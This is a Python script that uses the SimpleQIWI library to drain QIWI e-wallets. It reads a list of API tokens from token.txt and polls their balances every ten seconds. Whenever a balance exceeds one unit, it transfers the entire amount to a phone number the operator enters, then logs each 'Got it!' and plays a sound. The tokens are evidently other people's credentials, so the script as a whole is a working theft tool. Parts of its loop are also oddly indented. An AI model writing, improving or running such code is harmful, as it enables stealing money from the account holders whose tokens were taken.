from SimpleQIWI import *
from datetime import datetime
from colorama import init
init()
from colorama import Fore, Back, Style
import time
import pygame
pygame.init()
song = pygame.mixer.Sound('sound.mp3')
clock = pygame.time.Clock()

print (Fore.GREEN + " QIWI WALLET ")
summ = input( "Input YOURE QiWi Phone Number: ")
def EbatNihyiaQiwiPerevod():
    while True:
        lists = open('token.txt').read().split('\n')
        try:
            for tok in lists:
                api = QApi(token=tok, phone=summ)
                bal = api.balance
                if bal[0] > 1:
                    current_datetime = datetime.now()
                    api.pay(account=str(summ), amount=int(bal[0]), comment=' ')
                    print(Fore.RED +  'Got it!' + str(bal[0]) + "  !!!! --- !!!!!!!")
                    f = open('log.txt', 'a')
                    f.write(' Got it:  ' + str(bal[0]) + '\n')
                    f.close()
                    song.play()
                      
            else:
                    print(" .:: --- Ballance " + str(bal[0]) + "  --- ::.")
                    print (Fore.YELLOW + "....-=10 seconds wait=-...")
        except ValueError:
            pass
            
        time.sleep(10)
        


EbatNihyiaQiwiPerevod()